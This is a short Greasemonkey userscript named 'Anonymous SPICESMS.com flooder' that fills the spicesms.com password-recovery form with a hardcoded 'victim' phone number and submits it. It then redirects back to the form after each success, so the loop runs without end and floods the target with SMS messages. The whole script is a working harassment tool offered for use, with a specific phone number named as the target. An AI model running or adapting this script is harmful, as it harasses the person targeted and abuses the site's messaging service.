// ==UserScript==
// @name          Anonymous SPICESMS.com flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*spicesms.com/*
// ==/UserScript==

var victim=8092262928//Enter victims number here

if(document.location=="http://spicesms.com/recover.php"||document.location=="http://spicesms.com/recover.php")
{
document.forms[1].elements[0].value=victim;
document.forms[1].submit();
}
if(document.location=="http://spicesms.com/recover.php?sucess"||document.location=="http://spicesms.com/recover.php?sucess")
document.location='http://spicesms.com/recover.php';